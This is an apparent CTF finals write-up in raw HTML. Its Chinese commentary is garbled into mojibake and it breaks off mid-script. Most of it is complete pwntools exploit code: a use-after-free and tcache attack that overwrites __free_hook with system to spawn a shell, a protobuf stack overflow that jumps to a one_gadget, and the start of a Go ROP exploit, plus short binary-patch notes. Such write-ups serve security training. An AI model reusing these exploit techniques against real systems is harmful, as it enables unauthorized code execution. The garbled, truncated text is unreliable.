        <content type="html"><![CDATA[<blockquote><p>å…¥å›´å†³èµ›ï¼Œä¸æ‰æ­¤è¡Œå§</p></blockquote><p><img src="/EXP_FILE/a93659a4e81aa611ef0c9e7fa4bcc640_MD5.jpeg"><br><img src="/EXP_FILE/080007363601715580c7f21bb36ab8c9_MD5.jpeg"></p><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>2.31 UAFï¼Œtcache æ‰“__free_hookå³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'5. exit'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ecbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³äºpatchï¼Œæˆ‘ç›´æ¥æŠŠ free è¿™æ¡ä»£ç åˆ é™¤äº†<br><img src="/EXP_FILE/799389c69a658f8d66246317506c0518_MD5.jpeg"></p><h1 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h1><p>å°±æ˜¯ä¸€ä¸ªprotobufçš„åºåˆ—åŒ–ï¼Œæ ˆæº¢å‡ºï¼Œæˆ‘ç›´æ¥æ‰“çš„one_gadget</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">protoMessage</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> name <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> phoneNumber <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">bytes</span> buffer <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">uint32</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> message_pb2<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>phoneNumber<span class="token punctuation">,</span><span class="token builtin">buffer</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>msg<span class="token operator">=</span>message_pb2<span class="token punctuation">.</span>protoMessage<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>name<span class="token operator">=</span>namemsg<span class="token punctuation">.</span>phoneNumber<span class="token operator">=</span>phoneNumbermsg<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token operator">=</span><span class="token builtin">buffer</span>msg<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token keyword">return</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">'Gift: 0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x210</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x0000000000003344)'</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>message<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³äºpatchçš„è¯ï¼Œæˆ‘é¦–å…ˆçš„æ€è·¯æ˜¯é™åˆ¶ memcpy è¯»å…¥ä¸ºä¸€ä¸ªå®šå€¼ï¼Œä½†æ˜¯æ­»æ´»è¿‡ä¸æ‰check<br><img src="/EXP_FILE/704dfb3bbb15aeedd79bdb4d09416ffa_MD5.jpeg"><br>æƒ³æƒ³ç´¢æ€§ç›´æ¥æŠŠmemcpyåˆ æ‰ï¼Œæ”¹ä¸‹putsçš„å‚æ•°ä¸ºrcxï¼Œä¸å½±å“æ­£å¸¸æœåŠ¡<br><img src="/EXP_FILE/703afa5a3337bdd51e4d53d2faa6db76_MD5.jpeg"><br><img src="/EXP_FILE/af47872762f6925e6788a8a4856389dc_MD5.jpeg"></p><h1 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h1><p>goè¯­è¨€é™æ€å°ç¨‹åºï¼Œæœ‰æ ˆæº¢å‡ºã€‚ï¼ˆciscnå¯¹goæƒ…æœ‰ç‹¬é’Ÿå—ï¼‰</p><p>èµ°open_syscallåœ¨bssä¸Šå†™binshï¼Œç„¶åexecve_syscallå³å¯ï¼Œåªæ˜¯å¯„å­˜å™¨çš„gadgetéš¾æ‰¾ä¸€äº›</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your choice > '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token 